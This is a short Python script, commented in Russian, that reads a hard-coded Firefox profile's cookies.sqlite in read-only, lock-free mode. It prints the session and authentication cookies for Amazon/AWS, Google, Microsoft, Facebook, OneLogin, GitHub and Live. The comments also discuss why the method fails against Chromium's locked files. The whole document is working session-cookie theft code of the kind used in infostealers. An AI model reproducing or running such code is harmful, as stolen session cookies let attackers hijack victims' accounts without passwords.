import sqlite3, glob, os
from pathlib import Path

# это просто формат ответа в котором хранятся куки
INTERESTING = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user", "xs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
    ".fake.com" : ["ASDF"]
}

profiles = [r"C:\Users\0987a\AppData\Roaming\Mozilla\Firefox\Profiles\ow7ajeo5.default-release\cookies.sqlite"]

'''
Что примечательно в браузерах с движком хромиум
такая штука не сработает поскольку файл также может читаться
только процессом бразуера(как было с кредами)
'''

import base64
for db in profiles:
    # uri подключение к базе данных
    # mode = ro  - только чтение
    # immputable=1 - не меняем файл - не берем лок
    uri = f"file:{Path(db)}?mode=ro&immutable=1"
    conn = sqlite3.connect(uri, uri = True) # подключение 
    cur = conn.execute("SELECT host, name, value FROM moz_cookies")
    for host, name, value in cur:
        if any(host.endswith(d) and name in ns for d, ns in INTERESTING.items()):
            print(f"{Path(db).parent}  {host}  {name}  {value.encode('utf-8')}")
    conn.close()